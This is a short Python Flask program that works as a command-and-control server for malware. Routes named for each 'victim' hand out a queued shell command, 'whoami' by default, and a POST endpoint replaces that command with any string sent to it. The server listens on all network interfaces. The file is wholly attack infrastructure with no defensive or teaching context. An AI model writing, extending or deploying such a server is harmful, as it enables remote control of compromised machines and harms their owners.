from flask import Flask, request, jsonify

app = Flask(__name__)

commands = {"default": "whoami"}

@app.route("/api/command/<victim>", methods=["GET"])
def get_command(victim):
    return jsonify({"victim": victim, "command": commands["default"]})

@app.route("/api/command/<victim>", methods=["POST"])
def set_command(victim):
    data = request.json
    if "command" not in data:
        return jsonify({"error": "Missing command"}), 400
    commands["default"] = data["command"]
    return jsonify({"victim": victim, "command": commands["default"]})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
